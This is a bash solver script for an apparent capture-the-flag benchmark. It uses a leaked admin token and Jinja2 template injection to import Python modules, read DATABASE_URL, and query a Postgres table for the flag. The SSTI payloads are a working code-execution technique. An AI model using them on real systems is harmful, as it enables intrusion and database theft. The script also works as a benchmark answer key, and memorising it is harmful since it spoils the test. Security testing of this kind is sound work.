#!/usr/bin/env bash
# APEX-046-25 — "FederAuth SAML Bypass" (tags: saml, ssti, credential_extraction)
#
# The benchmark is named for XML signature wrapping, and the flag does not come
# from it. `/admin/users/search` renders its query through Jinja2 as template
# *source*, so `{{ 7*7 }}` is 49 and `{% set %}` is a statement — which makes
# the search box a Python interpreter with the application's own imports.
#
# The portal asks for a token in the query string and the token is a constant in
# its source, `adm1n_t0k3n_f3d3r4uth`, so the SAML half is not load-bearing
# either. What the SSTI is worth is that it does not stop at reading the
# environment: `DATABASE_URL` is in there, and Jinja statements are enough to
# import the driver, connect, and select — no shell, no second stage.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex046-$$"
IMPORT="request.application.__globals__.__builtins__.__import__"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# The connection string the application itself was given.
DB="$(send "$SESSION" req_0 --create \
    --set path=/admin/users/search \
    --set query.token=adm1n_t0k3n_f3d3r4uth \
    --set "query.q={{ $IMPORT('os').environ.get('DATABASE_URL') }}" |
    grep -o 'postgresql://[^ <"]*' | head -1)"

# And then the database, from inside the process that holds it open.
send "$SESSION" req_0 --create \
    --set path=/admin/users/search \
    --set query.token=adm1n_t0k3n_f3d3r4uth \
    --set "query.q={% set pg = $IMPORT('psycopg2') %}{% set c = pg.connect('$DB') %}{% set k = c.cursor() %}{% set _ = k.execute(\"SELECT value FROM system_config WHERE key='master_flag'\") %}{{ k.fetchone()[0] }}" |
    flag
